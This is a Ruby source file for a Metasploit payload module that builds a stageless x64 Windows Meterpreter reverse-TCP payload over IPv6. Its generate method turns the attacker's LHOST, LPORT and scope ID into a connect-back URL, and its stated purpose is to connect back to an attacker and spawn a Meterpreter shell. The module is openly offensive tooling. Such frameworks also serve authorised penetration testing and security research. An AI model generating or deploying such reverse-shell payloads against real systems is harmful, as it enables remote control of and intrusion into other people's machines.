##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'

module Metasploit4

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_x64_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
    ], self.class)
  end

  def generate
    url = "tcp6://#{datastore['LHOST']}:#{datastore['LPORT']}?#{datastore['SCOPEID']}"
    generate_stageless_x64(url)
  end

end


